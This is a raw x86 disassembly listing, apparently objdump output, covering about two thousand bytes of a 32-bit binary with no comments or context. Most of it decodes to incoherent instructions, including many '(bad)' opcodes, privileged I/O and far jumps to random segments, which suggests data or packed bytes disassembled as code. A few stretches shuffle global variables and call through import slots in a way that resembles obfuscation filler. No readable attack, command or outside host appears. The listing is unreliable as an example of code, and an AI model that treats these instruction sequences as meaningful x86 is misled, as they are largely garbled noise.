  4049fd:	pop    ebx
  4049fe:	dec    ecx
  4049ff:	dec    ebx
  404a00:	push   ebp
  404a01:	outs   dx,BYTE PTR ds:[esi]
  404a02:	call   0x4be3:0x264ad428
  404a09:	outs   dx,DWORD PTR ds:[esi]
  404a0a:	scas   eax,DWORD PTR es:[edi]
  404a0b:	inc    ebx
  404a0c:	xlat   BYTE PTR ds:[ebx]
  404a0d:	xor    dl,BYTE PTR [ecx-0x6b]
  404a10:	out    dx,al
  404a11:	addr16 and bh,ch
  404a14:	lds    esp,FWORD PTR [ebp-0x4c4ca3cd]
  404a1a:	push   es
  404a1b:	pop    edx
  404a1c:	lea    ebp,[ecx-0x1]
  404a1f:	xchg   BYTE PTR [edi-0x5f82968c],ch
  404a25:	clc    
  404a26:	rep stos DWORD PTR es:[edi],eax
  404a28:	stos   BYTE PTR es:[edi],al
  404a29:	cmp    esp,0x2e
  404a2c:	sti    
  404a2d:	add    al,al
  404a2f:	xchg   edx,eax
  404a30:	call   FWORD PTR [ebp-0x5304e180]
  404a36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a37:	cmc    
  404a38:	mov    ds:0xb90b062a,eax
  404a3d:	add    DWORD PTR [esi-0x17e9cea9],ebx
  404a43:	retf   0xcd1f
  404a46:	jp     0x404aab
  404a48:	jo     0x4049e4
  404a4a:	(bad)  
  404a4c:	popf   
  404a4d:	mov    edi,0xec27ecb6
  404a52:	imul   ecx,DWORD PTR es:[ecx],0xccaf1bd0
  404a59:	xor    BYTE PTR ds:0x73578e72,0x80
  404a60:	jg     0x404a1c
  404a62:	fsubr  DWORD PTR [esi+0x5b]
  404a65:	fiadd  WORD PTR [ecx-0x1f]
  404a68:	out    0x46,al
  404a6a:	sahf   
  404a6b:	sub    BYTE PTR [ebp+0x9],ah
  404a6e:	sub    dh,BYTE PTR [ecx+ecx*4+0x45fae35d]
  404a75:	int3   
  404a76:	jge    0x404a55
  404a78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a79:	dec    eax
  404a7a:	nop
  404a7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a7c:	cmc    
  404a7d:	sub    eax,0x4f23d8ef
  404a82:	add    DWORD PTR [ebx],edi
  404a84:	and    DWORD PTR [eax-0x3ff3bddf],esi
  404a8a:	outs   dx,BYTE PTR ds:[esi]
  404a8b:	jmp    DWORD PTR [esi-0x3b89504d]
  404a91:	shrd   ecx,eax,0x2
  404a95:	add    DWORD PTR ds:0x4229a2,edi
  404a9b:	shr    eax,0x2
  404a9e:	mov    eax,DWORD PTR [ebx]
  404aa0:	mov    edx,DWORD PTR ds:0x4229a2
  404aa6:	xor    DWORD PTR ds:0x4228b2,edx
  404aac:	mov    edx,DWORD PTR [ebx+0x4]
  404aaf:	and    DWORD PTR ds:0x42293e,0x42295a
  404ab9:	xor    ecx,edi
  404abb:	shl    eax,0x1e
  404abe:	adc    DWORD PTR ds:0x4229a6,0x6b1a
  404ac8:	xor    eax,eax
  404aca:	or     DWORD PTR ds:0x422942,edi
  404ad0:	jmp    0x40505a
  404ad5:	xchg   DWORD PTR [edx+esi*8-0x3a],ebx
  404ad9:	fcomp  DWORD PTR [eax]
  404adb:	xor    bl,BYTE PTR [ecx+ebx*8]
  404ade:	ins    BYTE PTR es:[edi],dx
  404adf:	jp     0x404a8f
  404ae1:	into   
  404ae2:	xchg   ebx,eax
  404ae3:	mov    dh,0xae
  404ae5:	lods   al,BYTE PTR ds:[esi]
  404ae6:	mov    bh,0x16
  404ae8:	push   ss
  404ae9:	cmp    eax,0xf8161604
  404aee:	dec    edi
  404aef:	ret    
  404af0:	sub    eax,0xcbc13a4d
  404af5:	jmp    FWORD PTR [eax+0x11]
  404af8:	and    DWORD PTR gs:[ebx+ecx*2+0x1c],0x57
  404afe:	(bad)  
  404aff:	adc    DWORD PTR [ecx+0x588b3c65],eax
  404b05:	mov    ch,0xb2
  404b07:	das    
  404b08:	inc    BYTE PTR [edi+0x687a0a3e]
  404b0e:	imul   eax,DWORD PTR [eax],0x51ff84bd
  404b14:	loope  0x404b69
  404b16:	push   ds
  404b17:	js     0x404ac3
  404b19:	sbb    al,0x47
  404b1b:	(bad)
  404b1f:	sub    dh,BYTE PTR [eax+esi*1]
  404b22:	xchg   esp,eax
  404b23:	add    al,0x5b
  404b25:	jo     0x404ab5
  404b27:	pop    edi
  404b28:	xchg   dl,al
  404b2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b2b:	cdq    
  404b2c:	(bad)  
  404b2e:	ja     0x404b49
  404b30:	xchg   edx,eax
  404b31:	adc    al,0x97
  404b33:	cmp    bh,BYTE PTR [ebp+0x48]
  404b36:	xchg   ecx,eax
  404b37:	dec    edx
  404b38:	xor    eax,0xa36de7d2
  404b3d:	sbb    BYTE PTR [eax+0x44],dl
  404b40:	test   eax,0x2b9e7a5d
  404b45:	pop    es
  404b46:	shl    DWORD PTR [ecx-0x200ae159],0x9
  404b4d:	cwde   
  404b4e:	mov    dl,0xf4
  404b50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b51:	lea    eax,[esi]
  404b53:	imul   ebx,DWORD PTR [ecx-0x2c],0xffffffc4
  404b57:	adc    al,0x5e
  404b59:	mov    al,0x11
  404b5b:	(bad)  
  404b5c:	mov    dl,0x83
  404b5e:	xor    BYTE PTR [edx+0x3aa747ff],ch
  404b64:	or     esp,ebx
  404b66:	pop    edi
  404b67:	loopne 0x404b34
  404b69:	add    DWORD PTR [ecx-0x6ebabe81],esi
  404b6f:	push   esi
  404b70:	mov    ?,WORD PTR [ebx-0x6f]
  404b73:	nop
  404b74:	mov    BYTE PTR [eax+0x76ea7f73],ah
  404b7a:	lock fsubrp st(1),st
  404b7d:	mov    edi,0xbc8c49bf
  404b82:	and    dh,BYTE PTR [ebx+0x4ecf6229]
  404b88:	sub    eax,0xde9feaab
  404b8d:	hlt    
  404b8e:	cs mov edi,0x2c94f6af
  404b94:	xchg   ecx,eax
  404b95:	sub    edi,esi
  404b97:	cs ss out 0x56,eax
  404b9b:	mov    edx,0x7355f665
  404ba0:	mov    ecx,0x408ecfdb
  404ba5:	mov    bl,BYTE PTR [ebp+0x5e]
  404ba8:	stc    
  404ba9:	mov    bl,0x70
  404bab:	jns    0x404b78
  404bad:	add    DWORD PTR [edx],eax
  404baf:	mov    eax,0xd6fad0e4
  404bb4:	out    dx,al
  404bb5:	ds fxch st(0)
  404bb8:	adc    ch,BYTE PTR [edi+0x66fb0f73]
  404bbe:	sahf   
  404bbf:	jecxz  0x404c2f
  404bc1:	(bad)  
  404bc2:	aas    
  404bc3:	out    dx,al
  404bc4:	ds push edx
  404bc6:	inc    edx
  404bc7:	pop    es
  404bc8:	(bad)  
  404bc9:	repnz mov dl,0xe9
  404bcc:	rol    DWORD PTR [edx+0x1f2bc27d],1
  404bd2:	icebp  
  404bd3:	and    al,0x62
  404bd5:	xor    ch,0x9f
  404bd8:	adc    bh,BYTE PTR [ebp-0x6078d85]
  404bde:	mov    al,ss:0xbcbed1e
  404be4:	or     DWORD PTR [ebp+0x63],eax
  404be7:	adc    al,0x2c
  404be9:	pop    ebx
  404bea:	sbb    ah,BYTE PTR [eax+ebp*4]
  404bed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404bee:	stc    
  404bef:	scas   al,BYTE PTR es:[edi]
  404bf0:	nop
  404bf1:	jmp    0x2f85:0xea4e4cb7
  404bf8:	test   edx,0xb1b51b6a
  404bfe:	inc    esp
  404bff:	mov    esp,0x266f674d
  404c04:	pop    eax
  404c05:	ja     0x404c4f
  404c07:	loopne 0x404c65
  404c09:	xchg   edi,eax
  404c0a:	das    
  404c0b:	call   0x29e5eec3
  404c10:	and    DWORD PTR [ecx],0x42535272
  404c16:	scas   al,BYTE PTR es:[edi]
  404c17:	scas   eax,DWORD PTR es:[edi]
  404c18:	test   eax,0xefaf02d4
  404c1d:	jns    0x404c78
  404c1f:	xchg   edx,eax
  404c20:	push   0xffffff90
  404c22:	lock adc DWORD PTR [eax-0x23],ebx
  404c26:	mov    WORD PTR [esi],fs
  404c28:	loope  0x404bfa
  404c2a:	xchg   DWORD PTR [eax-0x54],edi
  404c2d:	call   DWORD PTR [esi+0x6a6c076d]
  404c33:	(bad)  
  404c34:	in     al,dx
  404c35:	mov    dl,0x76
  404c37:	mov    esp,0x4ae8bc29
  404c3c:	mov    dl,al
  404c3e:	ds (bad) 
  404c41:	push   0x7a
  404c43:	mov    DWORD PTR [edx],eax
  404c45:	adc    eax,0x31ef5613
  404c4a:	rcl    DWORD PTR [eax-0x3319dc78],1
  404c50:	loope  0x404c7c
  404c52:	scas   al,BYTE PTR es:[edi]
  404c53:	xor    DWORD PTR [eax+edi*4-0x4db5d578],esp
  404c5a:	mov    edi,0x5db4a7b1
  404c5f:	sub    eax,0xf3091b4c
  404c64:	xchg   ebp,eax
  404c65:	and    eax,0xa6edfcad
  404c6a:	std    
  404c6b:	enter  0x68df,0x18
  404c6f:	jnp    0x404c78
  404c71:	out    dx,eax
  404c72:	adc    DWORD PTR ds:0xc434aba1,esi
  404c78:	mov    ecx,0xd68cda69
  404c7d:	mov    edx,0x3f590851
  404c82:	push   ss
  404c83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c84:	mov    dh,0x17
  404c86:	inc    DWORD PTR [eax-0x2d]
  404c89:	mov    ch,0x7d
  404c8b:	inc    edx
  404c8c:	jecxz  0x404c70
  404c8e:	pop    ebp
  404c8f:	jmp    0x8736:0xb519b26a
  404c96:	loope  0x404c25
  404c98:	fist   DWORD PTR [edi+0x5be03c77]
  404c9e:	cs push cs
  404ca0:	or     DWORD PTR [esi+0x3d],ebx
  404ca3:	sti    
  404ca4:	cmovbe esi,edi
  404ca7:	(bad)  
  404ca8:	sub    BYTE PTR [edx],al
  404caa:	outs   dx,BYTE PTR ds:[esi]
  404cab:	lods   al,BYTE PTR ds:[esi]
  404cac:	fild   WORD PTR [esi]
  404cae:	leave  
  404caf:	rol    DWORD PTR [ecx-0x35f96a26],1
  404cb5:	daa    
  404cb6:	adc    eax,0x906018f1
  404cbb:	mov    bl,0xab
  404cbd:	adc    eax,0xb9576ff7
  404cc2:	and    cl,bl
  404cc4:	adc    BYTE PTR [ebx+edi*1],0x17
  404cc8:	push   0x67
  404cca:	adc    al,0xb3
  404ccc:	jae    0x404cd9
  404cce:	mov    ah,BYTE PTR [ebp+edx*1+0x51616b0f]
  404cd5:	dec    ebx
  404cd6:	js     0x404d50
  404cd8:	add    dh,BYTE PTR [edx+0x20d8d5cb]
  404cde:	add    esp,DWORD PTR [ebx-0x352d1796]
  404ce4:	(bad)  
  404ce5:	pusha  
  404ce6:	lahf   
  404ce7:	loope  0x404d3b
  404ce9:	stos   BYTE PTR es:[edi],al
  404cea:	enter  0xa12b,0x17
  404cee:	and    al,0xf1
  404cf0:	mov    BYTE PTR [ebp+0x14],cl
  404cf3:	or     edi,edi
  404cf5:	loop   0x404cb3
  404cf7:	dec    esp
  404cf8:	cmp    al,0x40
  404cfa:	push   ebp
  404cfb:	bound  esp,QWORD PTR [ecx+0x45bd7536]
  404d01:	bound  esp,QWORD PTR [edi-0x5]
  404d04:	push   ecx
  404d05:	addr16 pop ecx
  404d07:	mov    cl,0xdb
  404d09:	imul   edx,DWORD PTR [ebp+ecx*4-0x6100d524],0x87984020
  404d14:	sub    DWORD PTR [edi],eax
  404d16:	jmp    0x4aef:0x877faa9d
  404d1d:	iret   
  404d1e:	fiadd  WORD PTR ds:0x5afb4c23
  404d24:	cdq    
  404d25:	cmp    eax,0xd522905d
  404d2a:	std    
  404d2b:	rcl    BYTE PTR [esi],1
  404d2d:	inc    BYTE PTR [edi+0x68]
  404d30:	mov    ecx,0x8f3a22d
  404d35:	pushf  
  404d36:	jge    0x404cf0
  404d38:	cmp    ch,BYTE PTR [ebp+ecx*1-0x5b3c63f5]
  404d3f:	jns    0x404d59
  404d41:	ret    
  404d42:	push   ecx
  404d43:	jno    0x404cef
  404d45:	mov    edi,0x2b07f08
  404d4a:	cs jp  0x404d77
  404d4d:	rcl    DWORD PTR [edi+0x225c62df],0x70
  404d54:	cmp    dl,BYTE PTR [eax+0x7b]
  404d57:	add    edx,DWORD PTR [esi-0x2864d1c2]
  404d5d:	xor    DWORD PTR [ebp-0x1c],0x1bfb4287
  404d64:	cmp    bl,BYTE PTR [esi]
  404d66:	arpl   bp,dx
  404d68:	out    0x79,eax
  404d6a:	jae    0x404d15
  404d6c:	fimul  DWORD PTR [ecx+0x50df11fd]
  404d72:	fwait
  404d73:	repz popf 
  404d75:	cmp    bh,BYTE PTR ds:0x649b829e
  404d7b:	mov    al,ds:0xcec384e2
  404d80:	sub    esp,eax
  404d82:	or     BYTE PTR [ecx+0x24],bh
  404d85:	xor    BYTE PTR [eax-0x25739303],0xd6
  404d8c:	cmp    BYTE PTR [ebx+eax*2],cl
  404d8f:	pop    ebx
  404d90:	cmp    edx,DWORD PTR ds:0x7ee96c0b
  404d96:	fiadd  DWORD PTR [ecx-0xa]
  404d99:	mov    al,ds:0x4fdceeb6
  404d9e:	cwde   
  404d9f:	or     al,0x21
  404da1:	hlt    
  404da2:	xchg   edx,eax
  404da3:	call   FWORD PTR [esi]
  404da5:	ret    0x8126
  404da8:	cmp    esi,esp
  404daa:	rcr    DWORD PTR [ebx+0x49c259b],1
  404db0:	ret    0x6204
  404db3:	jg     0x404de6
  404db5:	bound  ebp,QWORD PTR [edi+0x382bb751]
  404dbb:	jge    0x404dd1
  404dbd:	dec    ecx
  404dbe:	pop    esp
  404dbf:	and    BYTE PTR [ecx],0x8b
  404dc2:	lods   eax,DWORD PTR ds:[esi]
  404dc3:	mov    ecx,0xd12eeec
  404dc8:	js     0x404d5f
  404dca:	gs sub eax,0xfbf3b2c8
  404dd0:	imul   eax,DWORD PTR [edi+0x64],0xffffffec
  404dd4:	jns    0x404e40
  404dd6:	(bad)  
  404dd7:	pop    ebx
  404dd8:	inc    edx
  404dd9:	mov    eax,ds:0x5e466862
  404dde:	push   esi
  404ddf:	inc    edx
  404de0:	inc    ebx
  404de1:	push   eax
  404de2:	jbe    0x404da5
  404de4:	dec    edi
  404de5:	inc    ecx
  404de6:	push   es
  404de7:	mov    BYTE PTR [eax],ah
  404de9:	sbb    DWORD PTR [eax],0xffffffd8
  404dec:	push   edi
  404ded:	arpl   WORD PTR [ebp-0x68],sp
  404df0:	shr    dh,cl
  404df2:	fldcw  WORD PTR [ecx+0x7f0545f6]
  404df8:	adc    DWORD PTR [ebx],edx
  404dfa:	mov    ah,0x3b
  404dfc:	addr16 inc ebx
  404dfe:	xchg   ebp,eax
  404dff:	and    dh,BYTE PTR [ebx-0x24]
  404e02:	xchg   edi,eax
  404e03:	inc    ecx
  404e04:	lods   al,BYTE PTR ds:[esi]
  404e05:	je     0x404e34
  404e07:	xchg   ecx,eax
  404e08:	adc    ecx,DWORD PTR [ebp+0x0]
  404e0b:	inc    ecx
  404e0c:	xchg   esi,eax
  404e0d:	(bad)  
  404e0e:	shl    DWORD PTR [edi+ebp*1-0xfcd5ce],1
  404e15:	sub    ah,BYTE PTR [edx-0x76937356]
  404e1b:	sahf   
  404e1c:	jne    0x404dc6
  404e1e:	popf   
  404e1f:	jo     0x404de2
  404e21:	data16 fwait
  404e23:	inc    ecx
  404e24:	into   
  404e25:	ror    BYTE PTR [edx+eax*4-0x74],1
  404e29:	mov    ss,WORD PTR [ebp+0x1c]
  404e2c:	in     al,dx
  404e2d:	mov    ch,0x63
  404e2f:	rcr    BYTE PTR [ebp+0x66226705],0x8d
  404e36:	and    eax,0x7280c045
  404e3b:	mov    esi,0x8bf5883b
  404e40:	add    al,0xbd
  404e42:	mov    dl,0xbf
  404e44:	sbb    edi,ecx
  404e46:	shl    BYTE PTR [ecx-0x57],0xfc
  404e4a:	cmp    eax,DWORD PTR [esi+0x7d]
  404e4d:	adc    bl,BYTE PTR [eax+0x4d1756bc]
  404e53:	mov    ah,0x4c
  404e55:	gs aam 0xd5
  404e58:	jb     0x404e0a
  404e5a:	lahf   
  404e5b:	imul   ecx,DWORD PTR [esi],0xffffffa5
  404e5e:	mov    ecx,0x3481586
  404e63:	fs xchg esi,eax
  404e65:	add    ch,BYTE PTR [edi]
  404e67:	jne    0x404e75
  404e69:	and    eax,0x9fc5cda2
  404e6e:	mov    ds:0x4c9b731f,al
  404e73:	shr    BYTE PTR [ecx+0x60],cl
  404e76:	rcr    DWORD PTR [ebx-0x6f],cl
  404e79:	adc    al,0x9
  404e7b:	call   0xb06333
  404e80:	jo     0x404e5a
  404e82:	rol    BYTE PTR [esi+ecx*4-0x46],cl
  404e86:	adc    eax,0x83d25206
  404e8b:	aaa    
  404e8c:	mov    ch,0x6
  404e8e:	in     al,0x71
  404e90:	mov    dh,0x66
  404e92:	sub    edx,DWORD PTR [edx+eax*8+0x6fda25b7]
  404e99:	inc    edx
  404e9a:	sbb    eax,0xcb6358d7
  404e9f:	ret    0xc2e4
  404ea2:	ds mov eax,0xfe31d3ec
  404ea8:	add    bl,bh
  404eaa:	add    BYTE PTR ds:[esi+0x41e233c8],ch
  404eb1:	icebp  
  404eb2:	mov    BYTE PTR [ecx+0x36],ah
  404eb5:	sahf   
  404eb6:	fcom   DWORD PTR [eax-0x2b]
  404eb9:	into   
  404eba:	lock jne 0x404ed8
  404ebd:	jmp    0x6762:0xca5a8562
  404ec4:	rcr    BYTE PTR [ecx],0x39
  404ec7:	leave  
  404ec8:	int    0x6
  404eca:	and    al,0xa7
  404ecc:	dec    ebx
  404ecd:	enter  0x81b0,0xde
  404ed1:	jmp    0xb89fc32d
  404ed6:	mov    WORD PTR [esi-0x15],es
  404ed9:	fisub  DWORD PTR [esi]
  404edb:	inc    ecx
  404edd:	mov    ebx,0xfdc7d91f
  404ee2:	sbb    BYTE PTR [eax+ebp*8-0x248c765e],dh
  404ee9:	pop    ebp
  404eea:	fld    TBYTE PTR es:[ecx+ebx*8+0x34f1c0f6]
  404ef2:	xchg   edx,eax
  404ef3:	or     BYTE PTR [ebx-0x12750c38],0xcd
  404efa:	fs push edx
  404efc:	mov    eax,ds:0xd21df923
  404f01:	mov    ds:0x11468c0d,eax
  404f06:	and    edi,esp
  404f08:	enter  0x2edb,0x2d
  404f0c:	jge    0x404f0c
  404f0e:	data16 mov dh,0x39
  404f11:	mov    ds:0x8c0e1d94,eax
  404f16:	mov    DWORD PTR [edx-0x16],ebp
  404f19:	lods   al,BYTE PTR ds:[esi]
  404f1a:	jp     0x404f40
  404f1c:	jno    0x404ee4
  404f1e:	jmp    0x404f1d
  404f20:	or     dl,bl
  404f22:	mov    es,WORD PTR [edx-0x78]
  404f25:	jo     0x404ec5
  404f27:	cli    
  404f28:	pop    edi
  404f29:	mov    ebx,0x37efab69
  404f2e:	push   esi
  404f2f:	jne    0x404f9b
  404f31:	xchg   edi,eax
  404f32:	cmp    esi,esp
  404f34:	mov    eax,DWORD PTR [ebp-0x59d3e782]
  404f3a:	push   ebx
  404f3b:	pusha  
  404f3c:	xchg   esi,eax
  404f3d:	fdivr  st,st(7)
  404f3f:	jmp    0xcdc38d91
  404f44:	int    0x36
  404f46:	(bad)  
  404f47:	aas    
  404f48:	mov    ecx,0x1ece6ed6
  404f4d:	cld    
  404f4e:	jmp    DWORD PTR [edi-0xa]
  404f51:	lods   al,BYTE PTR ds:[esi]
  404f52:	enter  0x300f,0xc9
  404f56:	or     ecx,DWORD PTR [eax]
  404f58:	mov    esi,0x1b8c65f7
  404f5d:	nop
  404f5e:	add    DWORD PTR [ecx-0x16],ebp
  404f61:	imul   ecx,DWORD PTR [ebx-0x4c],0x8f85703
  404f68:	push   ebp
  404f69:	popf   
  404f6a:	jno    0x404f8a
  404f6c:	shl    ecx,cl
  404f6e:	mov    ebx,0x6659486c
  404f73:	icebp  
  404f74:	ins    BYTE PTR es:[edi],dx
  404f75:	or     DWORD PTR [ebp+0x10],eax
  404f78:	adc    DWORD PTR [ebx-0x5d],eax
  404f7b:	xchg   ebp,eax
  404f7c:	call   0x6196:0x46864f2c
  404f83:	sbb    BYTE PTR [ebp+0x7457b3e0],bh
  404f89:	sub    esi,DWORD PTR [edi-0x62dba6c9]
  404f8f:	lea    ebx,[esi-0x2f]
  404f92:	push   ss
  404f93:	xor    ecx,ecx
  404f95:	mov    BYTE PTR [eax+0x430bafe0],bl
  404f9b:	mov    esi,0x1818f3bb
  404fa0:	push   ds
  404fa1:	push   ecx
  404fa2:	push   ds
  404fa3:	into   
  404fa4:	fimul  WORD PTR [eax-0x2ce6bcce]
  404faa:	mov    esi,gs
  404fac:	imul   edx,edi,0xbcc66baf
  404fb2:	hlt    
  404fb3:	push   0x64
  404fb5:	mov    dl,0xda
  404fb7:	jl     0x404f69
  404fb9:	(bad)  
  404fba:	out    dx,al
  404fbb:	xor    al,BYTE PTR [ebp+0x30]
  404fbe:	inc    ebx
  404fbf:	pusha  
  404fc0:	std    
  404fc1:	pop    ebx
  404fc2:	popa   
  404fc3:	mov    ch,0x58
  404fc5:	xchg   edi,eax
  404fc7:	push   es
  404fc8:	xor    bh,BYTE PTR [edi+0x48de25c9]
  404fce:	pop    ebx
  404fcf:	mov    edi,0xe63bb800
  404fd4:	std    
  404fd5:	sub    DWORD PTR [ecx+0x3a],ecx
  404fd8:	aas    
  404fd9:	mov    al,0x22
  404fdb:	sbb    BYTE PTR [esi+ebx*8+0x5fcc04a5],al
  404fe2:	repz fbld TBYTE PTR [esi-0x3c02efc0]
  404fe9:	push   ebp
  404fea:	ficom  WORD PTR [esi+0x1f4c43fd]
  404ff0:	or     edx,ebx
  404ff2:	aad    0xef
  404ff4:	fwait
  404ff5:	sub    esi,DWORD PTR [ebx-0x51]
  404ff8:	sbb    cl,BYTE PTR [esp+edi*8-0x297a998f]
  404fff:	ja     0x405022
  405001:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405002:	(bad)  
  405003:	sti    
  405004:	jae    0x405000
  405006:	ret    0xbf44
  405009:	out    dx,al
  40500a:	inc    edi
  40500b:	pushf  
  40500c:	sbb    ch,BYTE PTR [ecx]
  40500e:	cmp    eax,0x997bc421
  405013:	pop    ss
  405014:	sbb    BYTE PTR [esi],dl
  405016:	pushf  
  405017:	retf   0x191a
  40501a:	jp     0x405096
  40501c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40501d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40501e:	call   0x73009a51
  405023:	push   ecx
  405024:	ret    
  405025:	ins    DWORD PTR es:[edi],dx
  405026:	mov    ah,0x6a
  405028:	mov    esi,0xc58b38c2
  40502d:	add    BYTE PTR [esi],ah
  40502f:	call   0xa55a06f7
  405034:	mov    bh,0xe5
  405036:	add    ecx,ebp
  405038:	pop    esp
  405039:	ret    
  40503a:	mov    ?,ebx
  40503c:	push   ecx
  40503d:	rcr    BYTE PTR [eax+0x543c008f],cl
  405043:	addr16 add eax,0x40047d3f
  405049:	lds    ebx,FWORD PTR [edi+ebx*8-0x6c]
  40504d:	mov    dl,0x1
  40504f:	push   ecx
  405050:	in     eax,dx
  405051:	pushf  
  405052:	cmp    ah,BYTE PTR ds:0x89b47ffa
  405058:	add    eax,0x81c10bf6
  40505d:	sub    eax,0x42294a
  405062:	mov    WORD PTR [esi],?
  405064:	add    BYTE PTR [eax],al
  405066:	mov    ecx,DWORD PTR [ebx]
  405068:	cmp    DWORD PTR ds:0x42291a,0x0
  40506f:	mov    edx,0x329b
  405074:	mov    DWORD PTR ds:0x42298e,edi
  40507a:	mov    DWORD PTR ds:0x422992,0x6944
  405084:	jmp    0x4050d1
  405089:	mov    DWORD PTR ds:0x4228a2,0x4c5b
  405093:	mov    DWORD PTR ds:0x42294a,0x78c7
  40509d:	jae    0x4050b9
  4050a3:	call   DWORD PTR ds:0x42a048
  4050a9:	and    DWORD PTR ds:0x422976,edi
  4050af:	sub    DWORD PTR ds:0x42292a,0xcc1
  4050b9:	add    edx,DWORD PTR ds:0x4228fe
  4050bf:	mov    edx,DWORD PTR ds:0x4229ae
  4050c5:	xor    DWORD PTR ds:0x42288a,edx
  4050cb:	xor    DWORD PTR ds:0x4228a6,ebx
  4050d1:	mov    edx,DWORD PTR [ebx+0x4]
  4050d4:	shrd   ecx,edx,0x2
  4050d8:	shr    edx,0x2
  4050db:	dec    edx
  4050dc:	mov    DWORD PTR [ebp-0x1c],ecx
  4050df:	mov    ecx,DWORD PTR [ebx]
  4050e1:	cmp    DWORD PTR ds:0x422956,0x0
  4050e8:	mov    DWORD PTR ds:0x4229a6,ecx
  4050ee:	mov    DWORD PTR ds:0x4228be,0x46b1
  4050f8:	mov    edx,0x1a3a
  4050fd:	jmp    0x405154
  405102:	mov    edx,DWORD PTR ds:0x4229be
  405108:	je     0x405144
  40510e:	push   0x4228ce
  405113:	push   0x891e
  405118:	call   DWORD PTR ds:0x42a298
  40511e:	mov    edx,DWORD PTR ds:0x422976
  405124:	sbb    DWORD PTR ds:0x4229a6,edx
  40512a:	or     DWORD PTR ds:0x4229b6,0x4229c6
  405134:	or     edx,DWORD PTR ds:0x4229ba
  40513a:	adc    DWORD PTR ds:0x42295a,0x7410
  405144:	xor    DWORD PTR ds:0x422932,0x293b
  40514e:	or     DWORD PTR ds:0x422982,edx
  405154:	mov    edx,DWORD PTR [ebx+0x4]
  405157:	or     DWORD PTR ds:0x422992,0x45bc
  405161:	xor    DWORD PTR [ebp-0x1c],edi
  405164:	sbb    DWORD PTR ds:0x4229ca,0x422976
  40516e:	xor    edx,edx
  405170:	not    DWORD PTR ds:0x4228d2
  405176:	or     edx,DWORD PTR [ebp-0x1c]
  405179:	or     DWORD PTR ds:0x42291e,0x4228e6
  405183:	jmp    0x40570d
  405188:	mov    cl,0xe1
  40518a:	inc    eax
  40518b:	test   al,0x40
  40518d:	sub    BYTE PTR [ecx],bl
  40518f:	fcomp  st(5)
  405191:	dec    edx
  405192:	int3   
  405193:	outs   dx,BYTE PTR ds:[esi]
  405194:	in     eax,0x70
  405196:	pop    eax
  405197:	mov    dl,0xdb
  405199:	mov    ds:0x43d1616,eax
  40519e:	push   ss
  40519f:	push   ss
  4051a0:	sub    BYTE PTR [edx-0x24],0xe7
  4051a4:	ror    BYTE PTR [ebx+0x78],1
  4051a7:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4051a9:	in     eax,dx
  4051aa:	(bad)  
  4051ab:	stos   DWORD PTR es:[edi],eax
  4051ac:	mov    al,0xe2
  4051ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4051af:	mov    ah,0x2
  4051b1:	lock and edx,DWORD PTR [esi+0x65c1e07f]
  4051b8:	leave  
  4051b9:	dec    eax
  4051ba:	test   al,0xfb
  4051bc:	mov    ds,ebx
  4051be:	lea    esi,[ecx-0x25b8347f]
  4051c4:	outs   dx,BYTE PTR ds:[esi]
  4051c5:	mov    BYTE PTR [edx-0x4cb1d31],al
  4051cb:	lea    ebp,[esp+ecx*8]
  4051ce:	(bad)  
  4051cf:	call   0xee61:0x4ea497c3
  4051d6:	test   al,0x75
  4051d8:	mov    bh,cl
  4051da:	add    bl,BYTE PTR [eax]
  4051dc:	cld    
  4051dd:	adc    dh,BYTE PTR [ebx-0x9e1b51f]
  4051e3:	mov    ?,eax
  4051e5:	daa    
  4051e6:	or     cl,cl
  4051e8:	jp     0x4051d4
  4051ea:	mov    bl,0x41
  4051ec:	js     0x4051cc
  4051ee:	ja     0x40521e
  4051f0:	mov    ds:0x73fde5fb,al
  4051f5:	xchg   esp,eax
  4051f6:	sub    al,0x1a
  4051f8:	lock jmp 0x556e7a0b
  4051fe:	cwde   
  4051ff:	mov    cl,0x6c
  405201:	xchg   ebp,eax
  405202:	data16 add BYTE PTR [esi+0x67],bl
  405206:	repz xrelease mov DWORD PTR [edi+0x4d64451f],eax
  40520e:	mov    dl,0x62
  405210:	into   
  405211:	inc    edx
  405212:	jecxz  0x405210
  405214:	and    ah,bh
  405216:	(bad)  
  405219:	adc    al,0x2e
  40521b:	cmp    esp,DWORD PTR [esi+0x3b1d3a07]
  405221:	jecxz  0x405229
  405223:	and    BYTE PTR [edi-0x66],al
  405226:	push   0x32
  405228:	ins    DWORD PTR es:[edi],dx
  405229:	les    eax,FWORD PTR [ecx+eax*1-0x35f2732b]
  405230:	adc    al,0xff
  405232:	in     eax,dx
  405233:	cdq    
  405234:	jp     0x4051bd
  405236:	test   eax,ebx
  405238:	push   ds
  405239:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40523a:	fstp   QWORD PTR [ebx]
  40523c:	sbb    eax,0xeda52e6d
  405241:	test   eax,0x6c337dd8
  405246:	rcr    DWORD PTR [eax],0x32
  405249:	clts   
  40524b:	dec    esp
  40524c:	mov    ch,0x6a
  40524e:	cmp    bl,al
  405250:	inc    edx
  405251:	andps  xmm6,xmm2
  405254:	icebp  
  405255:	clc    
  405256:	dec    ebp
  405257:	jp     0x405216
  405259:	sbb    al,0x20
  40525b:	repnz dec esi
  40525d:	(bad)
  405260:	add    ebx,0xe1488ba4
  405266:	sbb    BYTE PTR [ebp-0x6831b6d4],bl
  40526c:	sub    eax,0x767d82fb
  405271:	sub    esp,0xc
  405274:	loope  0x405294
  405276:	pop    ecx
  405277:	outs   dx,DWORD PTR ds:[esi]
  405278:	dec    esi
  405279:	add    BYTE PTR [ecx-0x22f77904],dh
  40527f:	jecxz  0x405226
  405281:	call   0x74a253f4
  405286:	call   0xd769:0x14e03777
  40528d:	cmp    eax,0xedf8668d
  405292:	cwde   
  405293:	out    dx,al
  405294:	dec    BYTE PTR [edi+0x37]
  405297:	stc    
